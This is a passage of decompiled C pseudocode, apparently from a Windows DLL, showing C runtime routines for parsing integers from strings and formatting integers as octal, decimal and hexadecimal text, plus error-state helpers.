    "    else",
    "    {",
    "      v13 = v9 - 48;",
    "    }",
    "    if ( !v13 )",
    "    {",
    "      LOBYTE(a2) = *v10;",
    "      *v6 = v10 + 1;",
    "      if ( (((_BYTE)a2 - 88) & 0xDF) != 0 )",
    "      {",
    "        *v6 = v10;",
    "        v14 = 8;",
    "        if ( a3 )",
    "          v14 = a3;",
    "        v5 = v14;",
    "        if ( (_BYTE)a2 && *v10 != (_BYTE)a2 )",
    "        {",
    "          *(_DWORD *)sub_18001A80C(v10, a2) = 22;",
    "          invalid_parameter_noinfo();",
    "        }",
    "        goto LABEL_30;",
    "      }",
    "      v9 = v10[1];",
    "      *v6 = v10 + 2;",
    "      v15 = 16;",
    "      goto LABEL_27;",
    "    }",
    "LABEL_26:",
    "    v15 = 10;",
    "LABEL_27:",
    "    if ( a3 )",
    "      v15 = a3;",
    "    v5 = v15;",
    "  }",
    "LABEL_30:",
    "  v16 = *v6;",
    "  v17 = 0xFFFFFFFF % v5;",
    "  v18 = 0xFFFFFFFF / v5;",
    "  while ( 1 )",
    "  {",
    "    if ( (unsigned __int8)(v9 - 48) > 9u )",
    "    {",
    "      if ( (unsigned __int8)(v9 - 97) > 0x19u )",
    "        v19 = (unsigned __int8)(v9 - 65) > 0x19u ? 0xFFFFFFFFLL : (unsigned int)(v9 - 55);",
    "      else",
    "        v19 = (unsigned int)(v9 - 87);",
    "    }",
    "    else",
    "    {",
    "      v19 = (unsigned int)(v9 - 48);",
    "    }",
    "    if ( (unsigned int)v19 >= v5 )",
    "      break;",
    "    v9 = *v16;",
    "    v17 = v5 * v11 + (unsigned int)v19;",
    "    v20 = (unsigned int)v17 < v5 * v11;",
    "    v21 = v11 < v18;",
    "    v22 = v11 == v18;",
    "    v11 = v17;",
    "    v12 |= (4 * (!v21 && !v22 || v20)) | 8;",
    "    *v6 = ++v16;",
    "  }",
    "  *v6 = v16 - 1;",
    "  if ( v9 && *(v16 - 1) != v9 )",
    "  {",
    "    *(_DWORD *)sub_18001A80C(v19, v17) = 22;",
    "    invalid_parameter_noinfo();",
    "  }",
    "  if ( (v12 & 8) == 0 )",
    "  {",
    "    v23 = (char **)v6[1];",
    "    *v6 = v4;",
    "    if ( v23 )",
    "      *v23 = v4;",
    "    return 0;",
    "  }",
    "  if ( (v12 & 4) != 0 )",
    "  {",
    "    v25 = 1;",
    "    v26 = v12;",
    "    goto LABEL_55;",
    "  }",
    "  if ( (v12 & 1) == 0 )",
    "  {",
    "    if ( (v12 & 2) == 0 )",
    "      goto LABEL_66;",
    "    goto LABEL_65;",
    "  }",
    "  if ( (v12 & 2) == 0 )",
    "  {",
    "    if ( v11 <= 0x7FFFFFFF )",
    "    {",
    "LABEL_66:",
    "      v29 = (char **)v6[1];",
    "      if ( v29 )",
    "        *v29 = *v6;",
    "      return v11;",
    "    }",
    "    goto LABEL_54;",
    "  }",
    "  if ( v11 <= 0x80000000 )",
    "  {",
    "LABEL_65:",
    "    v11 = -v11;",
    "    goto LABEL_66;",
    "  }",
    "LABEL_54:",
    "  v26 = 1;",
    "  v25 = v12;",
    "LABEL_55:",
    "  v27 = v12 & 2;",
    "  *(_BYTE *)(a1 + 48) = 1;",
    "  *(_DWORD *)(a1 + 44) = 34;",
    "  if ( (v26 & v25) == 0 )",
    "  {",
    "    v11 = -1;",
    "    goto LABEL_66;",
    "  }",
    "  v28 = (char **)v6[1];",
    "  if ( v27 )",
    "  {",
    "    if ( v28 )",
    "      *v28 = *v6;",
    "    return 0x80000000LL;",
    "  }",
    "  else",
    "  {",
    "    if ( v28 )",
    "      *v28 = *v6;",
    "    return 0x7FFFFFFF;",
    "  }",
    "}",
    "",
    "",
    "char __fastcall sub_180017ACC(__int64 a1, char a2)",
    "{",
    "  __int64 v2; // r8",
    "  int v5; // edx",
    "  __int64 v6; // rdi",
    "  __int64 *v7; // rcx",
    "  __int64 v8; // rsi",
    "  unsigned __int16 *v9; // rcx",
    "  unsigned __int8 *v10; // rcx",
    "  __int64 v11; // rax",
    "  unsigned int *v13; // rcx",
    "  __int64 v14; // r8",
    "",
    "  v2 = *(unsigned int *)(a1 + 52);",
    "  if ( (int)v2 > 5 )",
    "  {",
    "    v2 = (unsigned int)(v2 - 6);",
    "    if ( (_DWORD)v2 )",
    "    {",
    "      v2 = (unsigned int)(v2 - 1);",
    "      if ( (_DWORD)v2 )",
    "      {",
    "        v2 = (unsigned int)(v2 - 2);",
    "        if ( (_DWORD)v2 )",
    "          goto LABEL_6;",
    "      }",
    "    }",
    "  }",
    "  else if ( (_DWORD)v2 != 5 )",
    "  {",
    "    if ( !(_DWORD)v2 )",
    "      goto LABEL_25;",
    "    v2 = (unsigned int)(v2 - 1);",
    "    if ( !(_DWORD)v2 )",
    "    {",
    "      v5 = *(_DWORD *)(a1 + 40);",
    "      v6 = 1;",
    "      v10 = *(unsigned __int8 **)(a1 + 24);",
    "      *(_QWORD *)(a1 + 24) = v10 + 8;",
    "      if ( (v5 & 0x10) != 0 )",
    "        v8 = (char)*v10;",
    "      else",
    "        v8 = *v10;",
    "      goto LABEL_9;",
    "    }",
    "    v2 = (unsigned int)(v2 - 1);",
    "    if ( !(_DWORD)v2 )",
    "    {",
    "      v5 = *(_DWORD *)(a1 + 40);",
    "      v6 = 2;",
    "      v9 = *(unsigned __int16 **)(a1 + 24);",
    "      *(_QWORD *)(a1 + 24) = v9 + 4;",
    "      if ( (v5 & 0x10) != 0 )",
    "        v8 = (__int16)*v9;",
    "      else",
    "        v8 = *v9;",
    "      goto LABEL_9;",
    "    }",
    "LABEL_6:",
    "    v2 = (unsigned int)(v2 - 1);",
    "    if ( (_DWORD)v2 )",
    "    {",
    "      if ( (_DWORD)v2 != 1 )",
    "      {",
    "        v11 = *(_QWORD *)(a1 + 8);",
    "        *(_BYTE *)(v11 + 48) = 1;",
    "        *(_DWORD *)(v11 + 44) = 22;",
    "        sub_18001A598(0, 0, 0, 0, 0, *(_QWORD *)(a1 + 8));",
    "        return 0;",
    "      }",
    "      goto LABEL_8;",
    "    }",
    "LABEL_25:",
    "    v5 = *(_DWORD *)(a1 + 40);",
    "    v6 = 4;",
    "    v13 = *(unsigned int **)(a1 + 24);",
    "    *(_QWORD *)(a1 + 24) = v13 + 2;",
    "    if ( (v5 & 0x10) != 0 )",
    "      v8 = (int)*v13;",
    "    else",
    "      v8 = *v13;",
    "    goto LABEL_9;",
    "  }",
    "LABEL_8:",
    "  v5 = *(_DWORD *)(a1 + 40);",
    "  v6 = 8;",
    "  v7 = *(__int64 **)(a1 + 24);",
    "  *(_QWORD *)(a1 + 24) = v7 + 1;",
    "  v8 = *v7;",
    "LABEL_9:",
    "  if ( (v5 & 0x10) != 0 && v8 < 0 )",
    "  {",
    "    v8 = -v8;",
    "    v5 |= 0x40u;",
    "    *(_DWORD *)(a1 + 40) = v5;",
    "  }",
    "  if ( *(int *)(a1 + 48) >= 0 )",
    "  {",
    "    v14 = *(_QWORD *)(a1 + 8);",
    "    *(_DWORD *)(a1 + 40) = v5 & 0xFFFFFFF7;",
    "    sub_180017770(a1 + 80, *(int *)(a1 + 48), v14);",
    "  }",
    "  else",
    "  {",
    "    *(_DWORD *)(a1 + 48) = 1;",
    "  }",
    "  if ( !v8 )",
    "    *(_DWORD *)(a1 + 40) &= ~0x20u;",
    "  *(_BYTE *)(a1 + 76) = 0;",
    "  LOBYTE(v2) = a2;",
    "  if ( v6 == 8 )",
    "    sub_180018278(a1, v8, v2);",
    "  else",
    "    sub_1800180D8(a1, (unsigned int)v8, v2);",
    "  if ( (*(_DWORD *)(a1 + 40) & 0x80) != 0 && (!*(_DWORD *)(a1 + 72) || **(_BYTE **)(a1 + 64) != 48) )",
    "  {",
    "    *(_BYTE *)--*(_QWORD *)(a1 + 64) = 48;",
    "    ++*(_DWORD *)(a1 + 72);",
    "  }",
    "  return 1;",
    "}",
    "",
    "",
    "char __fastcall sub_180017CD0(__int64 a1, char a2)",
    "{",
    "  __int64 v2; // r8",
    "  int v5; // edx",
    "  __int64 v6; // rdi",
    "  __int64 *v7; // rcx",
    "  __int64 v8; // rsi",
    "  unsigned __int16 *v9; // rcx",
    "  unsigned __int8 *v10; // rcx",
    "  __int64 v11; // rax",
    "  unsigned int *v13; // rcx",
    "  __int64 v14; // r8",
    "",
    "  v2 = *(unsigned int *)(a1 + 52);",
    "  if ( (int)v2 > 5 )",
    "  {",
    "    v2 = (unsigned int)(v2 - 6);",
    "    if ( (_DWORD)v2 )",
    "    {",
    "      v2 = (unsigned int)(v2 - 1);",
    "      if ( (_DWORD)v2 )",
    "      {",
    "        v2 = (unsigned int)(v2 - 2);",
    "        if ( (_DWORD)v2 )",
    "          goto LABEL_6;",
    "      }",
    "    }",
    "  }",
    "  else if ( (_DWORD)v2 != 5 )",
    "  {",
    "    if ( !(_DWORD)v2 )",
    "      goto LABEL_25;",
    "    v2 = (unsigned int)(v2 - 1);",
    "    if ( !(_DWORD)v2 )",
    "    {",
    "      v5 = *(_DWORD *)(a1 + 40);",
    "      v6 = 1;",
    "      v10 = *(unsigned __int8 **)(a1 + 24);",
    "      *(_QWORD *)(a1 + 24) = v10 + 8;",
    "      if ( (v5 & 0x10) != 0 )",
    "        v8 = (char)*v10;",
    "      else",
    "        v8 = *v10;",
    "      goto LABEL_9;",
    "    }",
    "    v2 = (unsigned int)(v2 - 1);",
    "    if ( !(_DWORD)v2 )",
    "    {",
    "      v5 = *(_DWORD *)(a1 + 40);",
    "      v6 = 2;",
    "      v9 = *(unsigned __int16 **)(a1 + 24);",
    "      *(_QWORD *)(a1 + 24) = v9 + 4;",
    "      if ( (v5 & 0x10) != 0 )",
    "        v8 = (__int16)*v9;",
    "      else",
    "        v8 = *v9;",
    "      goto LABEL_9;",
    "    }",
    "LABEL_6:",
    "    v2 = (unsigned int)(v2 - 1);",
    "    if ( (_DWORD)v2 )",
    "    {",
    "      if ( (_DWORD)v2 != 1 )",
    "      {",
    "        v11 = *(_QWORD *)(a1 + 8);",
    "        *(_BYTE *)(v11 + 48) = 1;",
    "        *(_DWORD *)(v11 + 44) = 22;",
    "        sub_18001A598(0, 0, 0, 0, 0, *(_QWORD *)(a1 + 8));",
    "        return 0;",
    "      }",
    "      goto LABEL_8;",
    "    }",
    "LABEL_25:",
    "    v5 = *(_DWORD *)(a1 + 40);",
    "    v6 = 4;",
    "    v13 = *(unsigned int **)(a1 + 24);",
    "    *(_QWORD *)(a1 + 24) = v13 + 2;",
    "    if ( (v5 & 0x10) != 0 )",
    "      v8 = (int)*v13;",
    "    else",
    "      v8 = *v13;",
    "    goto LABEL_9;",
    "  }",
    "LABEL_8:",
    "  v5 = *(_DWORD *)(a1 + 40);",
    "  v6 = 8;",
    "  v7 = *(__int64 **)(a1 + 24);",
    "  *(_QWORD *)(a1 + 24) = v7 + 1;",
    "  v8 = *v7;",
    "LABEL_9:",
    "  if ( (v5 & 0x10) != 0 && v8 < 0 )",
    "  {",
    "    v8 = -v8;",
    "    v5 |= 0x40u;",
    "    *(_DWORD *)(a1 + 40) = v5;",
    "  }",
    "  if ( *(int *)(a1 + 48) >= 0 )",
    "  {",
    "    v14 = *(_QWORD *)(a1 + 8);",
    "    *(_DWORD *)(a1 + 40) = v5 & 0xFFFFFFF7;",
    "    sub_180017770(a1 + 80, *(int *)(a1 + 48), v14);",
    "  }",
    "  else",
    "  {",
    "    *(_DWORD *)(a1 + 48) = 1;",
    "  }",
    "  if ( !v8 )",
    "    *(_DWORD *)(a1 + 40) &= ~0x20u;",
    "  *(_BYTE *)(a1 + 76) = 0;",
    "  LOBYTE(v2) = a2;",
    "  if ( v6 == 8 )",
    "    sub_1800182E8(a1, v8, v2);",
    "  else",
    "    sub_180018148(a1, (unsigned int)v8, v2);",
    "  if ( (*(_DWORD *)(a1 + 40) & 0x80) != 0 && (!*(_DWORD *)(a1 + 72) || **(_BYTE **)(a1 + 64) != 48) )",
    "  {",
    "    *(_BYTE *)--*(_QWORD *)(a1 + 64) = 48;",
    "    ++*(_DWORD *)(a1 + 72);",
    "  }",
    "  return 1;",
    "}",
    "",
    "",
    "char __fastcall sub_180017ED4(__int64 a1, char a2)",
    "{",
    "  __int64 v2; // r8",
    "  int v5; // edx",
    "  __int64 v6; // rdi",
    "  __int64 *v7; // rcx",
    "  __int64 v8; // rsi",
    "  unsigned __int16 *v9; // rcx",
    "  unsigned __int8 *v10; // rcx",
    "  __int64 v11; // rax",
    "  unsigned int *v13; // rcx",
    "  __int64 v14; // r8",
    "",
    "  v2 = *(unsigned int *)(a1 + 52);",
    "  if ( (int)v2 > 5 )",
    "  {",
    "    v2 = (unsigned int)(v2 - 6);",
    "    if ( (_DWORD)v2 )",
    "    {",
    "      v2 = (unsigned int)(v2 - 1);",
    "      if ( (_DWORD)v2 )",
    "      {",
    "        v2 = (unsigned int)(v2 - 2);",
    "        if ( (_DWORD)v2 )",
    "          goto LABEL_6;",
    "      }",
    "    }",
    "  }",
    "  else if ( (_DWORD)v2 != 5 )",
    "  {",
    "    if ( !(_DWORD)v2 )",
    "      goto LABEL_25;",
    "    v2 = (unsigned int)(v2 - 1);",
    "    if ( !(_DWORD)v2 )",
    "    {",
    "      v5 = *(_DWORD *)(a1 + 40);",
    "      v6 = 1;",
    "      v10 = *(unsigned __int8 **)(a1 + 24);",
    "      *(_QWORD *)(a1 + 24) = v10 + 8;",
    "      if ( (v5 & 0x10) != 0 )",
    "        v8 = (char)*v10;",
    "      else",
    "        v8 = *v10;",
    "      goto LABEL_9;",
    "    }",
    "    v2 = (unsigned int)(v2 - 1);",
    "    if ( !(_DWORD)v2 )",
    "    {",
    "      v5 = *(_DWORD *)(a1 + 40);",
    "      v6 = 2;",
    "      v9 = *(unsigned __int16 **)(a1 + 24);",
    "      *(_QWORD *)(a1 + 24) = v9 + 4;",
    "      if ( (v5 & 0x10) != 0 )",
    "        v8 = (__int16)*v9;",
    "      else",
    "        v8 = *v9;",
    "      goto LABEL_9;",
    "    }",
    "LABEL_6:",
    "    v2 = (unsigned int)(v2 - 1);",
    "    if ( (_DWORD)v2 )",
    "    {",
    "      if ( (_DWORD)v2 != 1 )",
    "      {",
    "        v11 = *(_QWORD *)(a1 + 8);",
    "        *(_BYTE *)(v11 + 48) = 1;",
    "        *(_DWORD *)(v11 + 44) = 22;",
    "        sub_18001A598(0, 0, 0, 0, 0, *(_QWORD *)(a1 + 8));",
    "        return 0;",
    "      }",
    "      goto LABEL_8;",
    "    }",
    "LABEL_25:",
    "    v5 = *(_DWORD *)(a1 + 40);",
    "    v6 = 4;",
    "    v13 = *(unsigned int **)(a1 + 24);",
    "    *(_QWORD *)(a1 + 24) = v13 + 2;",
    "    if ( (v5 & 0x10) != 0 )",
    "      v8 = (int)*v13;",
    "    else",
    "      v8 = *v13;",
    "    goto LABEL_9;",
    "  }",
    "LABEL_8:",
    "  v5 = *(_DWORD *)(a1 + 40);",
    "  v6 = 8;",
    "  v7 = *(__int64 **)(a1 + 24);",
    "  *(_QWORD *)(a1 + 24) = v7 + 1;",
    "  v8 = *v7;",
    "LABEL_9:",
    "  if ( (v5 & 0x10) != 0 && v8 < 0 )",
    "  {",
    "    v8 = -v8;",
    "    v5 |= 0x40u;",
    "    *(_DWORD *)(a1 + 40) = v5;",
    "  }",
    "  if ( *(int *)(a1 + 48) >= 0 )",
    "  {",
    "    v14 = *(_QWORD *)(a1 + 8);",
    "    *(_DWORD *)(a1 + 40) = v5 & 0xFFFFFFF7;",
    "    sub_180017770(a1 + 80, *(int *)(a1 + 48), v14);",
    "  }",
    "  else",
    "  {",
    "    *(_DWORD *)(a1 + 48) = 1;",
    "  }",
    "  if ( !v8 )",
    "    *(_DWORD *)(a1 + 40) &= ~0x20u;",
    "  *(_BYTE *)(a1 + 76) = 0;",
    "  LOBYTE(v2) = a2;",
    "  if ( v6 == 8 )",
    "    sub_180018398(a1, v8, v2);",
    "  else",
    "    sub_1800181F4(a1, (unsigned int)v8, v2);",
    "  if ( (*(_DWORD *)(a1 + 40) & 0x80) != 0 && (!*(_DWORD *)(a1 + 72) || **(_BYTE **)(a1 + 64) != 48) )",
    "  {",
    "    *(_BYTE *)--*(_QWORD *)(a1 + 64) = 48;",
    "    ++*(_DWORD *)(a1 + 72);",
    "  }",
    "  return 1;",
    "}",
    "",
    "",
    "_BYTE *__fastcall sub_1800180D8(__int64 a1, unsigned int a2)",
    "{",
    "  __int64 v2; // r8",
    "  __int64 v4; // rax",
    "  _BYTE *v5; // rdx",
    "  _BYTE *i; // r8",
    "  int v7; // eax",
    "  char v8; // al",
    "  _BYTE *result; // rax",
    "",
    "  v2 = a1 + 80;",
    "  if ( *(_QWORD *)(a1 + 1112) )",
    "  {",
    "    v2 = *(_QWORD *)(a1 + 1112);",
    "    v4 = *(_QWORD *)(a1 + 1104) >> 1;",
    "  }",
    "  else",
    "  {",
    "    v4 = 512;",
    "  }",
    "  v5 = (_BYTE *)(v4 + v2 - 1);",
    "  *(_QWORD *)(a1 + 64) = v5;",
    "  for ( i = v5; ; i = *(_BYTE **)(a1 + 64) )",
    "  {",
    "    v7 = *(_DWORD *)(a1 + 48);",
    "    if ( v7 <= 0 && !a2 )",
    "      break;",
    "    *(_DWORD *)(a1 + 48) = v7 - 1;",
    "    v8 = a2 & 7;",
    "    a2 >>= 3;",
    "    *i = v8 + 48;",
    "    --*(_QWORD *)(a1 + 64);",
    "  }",
    "  result = i + 1;",
    "  *(_DWORD *)(a1 + 72) = (_DWORD)v5 - *(_DWORD *)(a1 + 64);",
    "  *(_QWORD *)(a1 + 64) = i + 1;",
    "  return result;",
    "}",
    "",
    "",
    "_BYTE *__fastcall sub_180018148(__int64 a1, unsigned int a2, char a3)",
    "{",
    "  __int64 v3; // rax",
    "  __int64 v5; // rcx",
    "  __int64 v8; // rax",
    "  char *v9; // r8",
    "  char *i; // r10",
    "  int v11; // eax",
    "  char v12; // al",
    "  _BYTE *result; // rax",
    "",
    "  v3 = *(_QWORD *)(a1 + 1112);",
    "  v5 = a1 + 80;",
    "  if ( v3 )",
    "  {",
    "    v5 = v3;",
    "    v8 = *(_QWORD *)(a1 + 1104) >> 1;",
    "  }",
    "  else",
    "  {",
    "    v8 = 512;",
    "  }",
    "  v9 = (char *)(v8 + v5 - 1);",
    "  *(_QWORD *)(a1 + 64) = v9;",
    "  for ( i = v9; ; i = *(char **)(a1 + 64) )",
    "  {",
    "    v11 = *(_DWORD *)(a1 + 48);",
    "    if ( v11 <= 0 && !a2 )",
    "      break;",
    "    *(_DWORD *)(a1 + 48) = v11 - 1;",
    "    v12 = a2 % 0xA + 48;",
    "    a2 /= 0xAu;",
    "    if ( v12 > 57 )",
    "      v12 += 32 * (a3 ^ 1) + 7;",
    "    *i = v12;",
    "    --*(_QWORD *)(a1 + 64);",
    "  }",
    "  result = i + 1;",
    "  *(_DWORD *)(a1 + 72) = (_DWORD)v9 - *(_DWORD *)(a1 + 64);",
    "  *(_QWORD *)(a1 + 64) = i + 1;",
    "  return result;",
    "}",
    "",
    "",
    "_BYTE *__fastcall sub_1800181F4(__int64 a1, unsigned int a2, char a3)",
    "{",
    "  __int64 v3; // r9",
    "  __int64 v6; // rax",
    "  unsigned __int8 *v7; // rdx",
    "  unsigned __int8 *i; // r8",
    "  int v9; // eax",
    "  char v10; // al",
    "  unsigned __int8 v11; // al",
    "  _BYTE *result; // rax",
    "",
    "  v3 = a1 + 80;",
    "  if ( *(_QWORD *)(a1 + 1112) )",
    "  {",
    "    v3 = *(_QWORD *)(a1 + 1112);",
    "    v6 = *(_QWORD *)(a1 + 1104) >> 1;",
    "  }",
    "  else",
    "  {",
    "    v6 = 512;",
    "  }",
    "  v7 = (unsigned __int8 *)(v6 + v3 - 1);",
    "  *(_QWORD *)(a1 + 64) = v7;",
    "  for ( i = v7; ; i = *(unsigned __int8 **)(a1 + 64) )",
    "  {",
    "    v9 = *(_DWORD *)(a1 + 48);",
    "    if ( v9 <= 0 && !a2 )",
    "      break;",
    "    *(_DWORD *)(a1 + 48) = v9 - 1;",
    "    v10 = a2 & 0xF;",
    "    a2 >>= 4;",
    "    v11 = v10 + 48;",
    "    if ( v11 > 0x39u )",
    "      v11 += 32 * (a3 ^ 1) + 7;",
    "    *i = v11;",
    "    --*(_QWORD *)(a1 + 64);",
    "  }",
    "  result = i + 1;",
    "  *(_DWORD *)(a1 + 72) = (_DWORD)v7 - *(_DWORD *)(a1 + 64);",
    "  *(_QWORD *)(a1 + 64) = i + 1;",
    "  return result;",
    "}",
    "",
    "",
    "_BYTE *__fastcall sub_180018278(__int64 a1, unsigned __int64 a2)",
    "{",
    "  __int64 v2; // r8",
    "  __int64 v4; // rax",
    "  _BYTE *v5; // rdx",
    "  _BYTE *i; // r8",
    "  int v7; // eax",
    "  char v8; // al",
    "  _BYTE *result; // rax",
    "",
    "  v2 = a1 + 80;",
    "  if ( *(_QWORD *)(a1 + 1112) )",
    "  {",
    "    v2 = *(_QWORD *)(a1 + 1112);",
    "    v4 = *(_QWORD *)(a1 + 1104) >> 1;",
    "  }",
    "  else",
    "  {",
    "    v4 = 512;",
    "  }",
    "  v5 = (_BYTE *)(v4 + v2 - 1);",
    "  *(_QWORD *)(a1 + 64) = v5;",
    "  for ( i = v5; ; i = *(_BYTE **)(a1 + 64) )",
    "  {",
    "    v7 = *(_DWORD *)(a1 + 48);",
    "    if ( v7 <= 0 && !a2 )",
    "      break;",
    "    *(_DWORD *)(a1 + 48) = v7 - 1;",
    "    v8 = a2 & 7;",
    "    a2 >>= 3;",
    "    *i = v8 + 48;",
    "    --*(_QWORD *)(a1 + 64);",
    "  }",
    "  result = i + 1;",
    "  *(_DWORD *)(a1 + 72) = (_DWORD)v5 - *(_DWORD *)(a1 + 64);",
    "  *(_QWORD *)(a1 + 64) = i + 1;",
    "  return result;",
    "}",
    "",
    "",
    "_BYTE *__fastcall sub_1800182E8(__int64 a1, unsigned __int64 a2, char a3)",
    "{",
    "  __int64 v3; // rax",
    "  __int64 v5; // rcx",
    "  __int64 v8; // rax",
    "  char *v9; // r8",
    "  char *i; // r10",
    "  int v11; // eax",
    "  char v12; // al",
    "  _BYTE *result; // rax",
    "",
    "  v3 = *(_QWORD *)(a1 + 1112);",
    "  v5 = a1 + 80;",
    "  if ( v3 )",
    "  {",
    "    v5 = v3;",
    "    v8 = *(_QWORD *)(a1 + 1104) >> 1;",
    "  }",
    "  else",
    "  {",
    "    v8 = 512;",
    "  }",
    "  v9 = (char *)(v8 + v5 - 1);",
    "  *(_QWORD *)(a1 + 64) = v9;",
    "  for ( i = v9; ; i = *(char **)(a1 + 64) )",
    "  {",
    "    v11 = *(_DWORD *)(a1 + 48);",
    "    if ( v11 <= 0 && !a2 )",
    "      break;",
    "    *(_DWORD *)(a1 + 48) = v11 - 1;",
    "    v12 = a2 % 0xA + 48;",
    "    a2 /= 0xAu;",
    "    if ( v12 > 57 )",
    "      v12 += 32 * (a3 ^ 1) + 7;",
    "    *i = v12;",
    "    --*(_QWORD *)(a1 + 64);",
    "  }",
    "  result = i + 1;",
    "  *(_DWORD *)(a1 + 72) = (_DWORD)v9 - *(_DWORD *)(a1 + 64);",
    "  *(_QWORD *)(a1 + 64) = i + 1;",
    "  return result;",
    "}",
    "",
    "",
    "_BYTE *__fastcall sub_180018398(__int64 a1, unsigned __int64 a2, char a3)",
    "{",
    "  __int64 v3; // r9",
    "  __int64 v6; // rax",
    "  unsigned __int8 *v7; // rdx",
    "  unsigned __int8 *i; // r8",
    "  int v9; // eax",
    "  char v10; // al",
    "  unsigned __int8 v11; // al",
    "  _BYTE *result; // rax",
    "",
    "  v3 = a1 + 80;",
    "  if ( *(_QWORD *)(a1 + 1112) )",
    "  {",
    "    v3 = *(_QWORD *)(a1 + 1112);",
    "    v6 = *(_QWORD *)(a1 + 1104) >> 1;",
    "  }",
    "  else",
    "  {",
    "    v6 = 512;",
    "  }",
    "  v7 = (unsigned __int8 *)(v6 + v3 - 1);",
    "  *(_QWORD *)(a1 + 64) = v7;",
    "  for ( i = v7; ; i = *(unsigned __int8 **)(a1 + 64) )",
    "  {",
    "    v9 = *(_DWORD *)(a1 + 48);",
    "    if ( v9 <= 0 && !a2 )",
    "      break;",
    "    *(_DWORD *)(a1 + 48) = v9 - 1;",
    "    v10 = a2 & 0xF;",
    "    a2 >>= 4;",
    "    v11 = v10 + 48;",
    "    if ( v11 > 0x39u )",
    "      v11 += 32 * (a3 ^ 1) + 7;",
    "    *i = v11;",
    "    --*(_QWORD *)(a1 + 64);",
    "  }",
    "  result = i + 1;",
    "  *(_DWORD *)(a1 + 72) = (_DWORD)v7 - *(_DWORD *)(a1 + 64);",
    "  *(_QWORD *)(a1 + 64) = i + 1;",
    "  return result;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_18001841C(__int64 **a1)",
    "{",
    "  __int64 **v1; // rbx",
    "  __int64 *v2; // r14",
    "  __int64 v3; // r15",
    "  char v4; // si",
    "  __int64 v5; // r11",
    "  __int64 v6; // r9",
    "  __int64 v7; // rdi",
    "  __int64 v8; // r10",
    "  __int64 *v9; // rcx",
    "  __int64 v10; // rcx",
    "  _QWORD v12[4]; // [rsp+28h] [rbp-E0h] BYREF",
    "  int v13; // [rsp+48h] [rbp-C0h]",
    "  int v14; // [rsp+4Ch] [rbp-BCh]",
    "  int v15; // [rsp+50h] [rbp-B8h]",
    "  int v16; // [rsp+54h] [rbp-B4h]",
    "  int v17; // [rsp+58h] [rbp-B0h]",
    "  __int16 v18; // [rsp+60h] [rbp-A8h]",
    "  int v19; // [rsp+70h] [rbp-98h]",
    "  char v20; // [rsp+74h] [rbp-94h]",
    "  __int128 lpMem; // [rsp+478h] [rbp+370h]",
    "  __int64 v22; // [rsp+488h] [rbp+380h]",
    "  int v23; // [rsp+490h] [rbp+388h]",
    "",
    "  v1 = a1;",
    "  v2 = a1[1];",
    "  v3 = **a1;",
    "  v4 = sub_180025E38(v3);",
    "  v5 = *v1[3];",
    "  v6 = **v1;",
    "  v7 = *v1[4];",
    "  v8 = *v1[2];",
    "  v9 = v1[1];",
    "  v13 = 0;",
    "  v15 = 0;",
    "  v16 = 0;",
    "  v17 = 0;",
    "  v18 = 0;",
    "  v19 = 0;",
    "  v23 = 0;",
    "  v12[1] = v9;",
    "  LOBYTE(v14) = 0;",
    "  v20 = 0;",
    "  lpMem = 0;",
    "  v22 = v6;",
    "  v12[0] = v8;",
    "  v12[2] = v5;",
    "  v12[3] = v7;",
    "  LODWORD(v1) = sub_1800186A8(v12);",
    "  sub_180023374(*((XSAVE_FORMAT **)&lpMem + 1));",
    "  *((_QWORD *)&lpMem + 1) = 0;",
    "  LOBYTE(v10) = v4;",
    "  sub_180025F00(v10, v3, v2);",
    "  return (unsigned int)v1;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_1800185B0(__int64 a1)",
    "{",
    "  DWORD LastError; // eax",
    "  bool v3; // zf",
    "  __int64 v4; // rax",
    "  DWORD v5; // ecx",
    "  __int64 v6; // rbx",
    "  __int64 v7; // rdx",
    "  __int64 v8; // rcx",
    "  __int64 v9; // r8",
    "  __int64 v10; // r9",
    "  DWORD dwErrCode; // [rsp+30h] [rbp+8h] BYREF",
    "",
    "  if ( !*(_QWORD *)a1 )",
    "  {",
    "    LastError = GetLastError();",
    "    v3 = *(_BYTE *)(a1 + 16) == 0;",
    "    dwErrCode = LastError;",
    "    if ( v3 )",
    "    {",
    "      *(_BYTE *)(a1 + 16) = 1;",
    "      *(_QWORD *)(a1 + 8) = 0;",
    "    }",
    "    v4 = sub_18002653C(&dwErrCode);",
    "    v5 = dwErrCode;",
    "    v6 = v4;",
    "    *(_QWORD *)a1 = v4;",
    "    SetLastError(v5);",
    "    if ( !v6 )",
    "      sub_1800219B0(v8, v7, v9, v10);",
    "  }",
    "  return *(_QWORD *)a1;",
    "}",
    "",
    "",
    "char __fastcall sub_180018618(__int64 a1, _DWORD *a2)",
    "{",
    "  __int64 v2; // rbp",
    "  char *v4; // rax",
    "  __int64 v5; // rbx",
    "  char v6; // cl",
    "  __int64 v7; // rax",
    "  char result; // al",
    "  char *v9[3]; // [rsp+20h] [rbp-18h] BYREF",
    "  char *v10; // [rsp+40h] [rbp+8h] BYREF",
    "",
    "  v2 = *(_QWORD *)(a1 + 8);",
    "  v4 = (char *)(*(_QWORD *)(a1 + 16) - 1LL);",
    "  v9[1] = (char *)&v10;",
    "  v5 = *(_QWORD *)(v2 + 44);",
    "  v10 = v4;",
    "  v9[0] = v4;",
    "  *a2 = sub_180017818(v2, v9, 0xAu, 1u);",
    "  v6 = 0;",
    "  v7 = *(_QWORD *)(a1 + 8);",
    "  if ( (!*(_BYTE *)(v7 + 48) || *(_DWORD *)(v7 + 44) != 34) && (unsigned __int64)v10 >= *(_QWORD *)(a1 + 16) )",
    "  {",
    "    *(_QWORD *)(a1 + 16) = v10;",
    "    v6 = 1;",
    "  }",
    "  result = v6;",
    "  *(_QWORD *)(v2 + 44) = v5;",
    "  return result;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_1800186A8(__int64 a1)",
    "{",
    "  __int64 v1; // rax",
    "  char *v3; // rcx",
    "  __int64 v4; // rax",
    "  int v6; // eax",
    "  char v7; // r8",
    "  unsigned __int8 v8; // cl",
    "  int v9; // eax",
    "  char v10; // al",
    "  _DWORD *v11; // rdx",
    "  int *v12; // rcx",
    "  int v13; // ecx",
    "  int *v14; // rcx",
    "  int v15; // eax",
    "  __int64 v16; // rdi",
    "  __int64 v17; // r8",
    "  _BYTE *v18; // rax",
    "  char *v19; // rax",
    "  __int64 v20; // rax",
    "  __int64 v21; // rax",
    "",
    "  v1 = *(_QWORD *)(a1 + 8);",
    "  if ( !*(_QWORD *)(a1 + 1120) )",
    "  {",
    "    *(_BYTE *)(v1 + 48) = 1;",
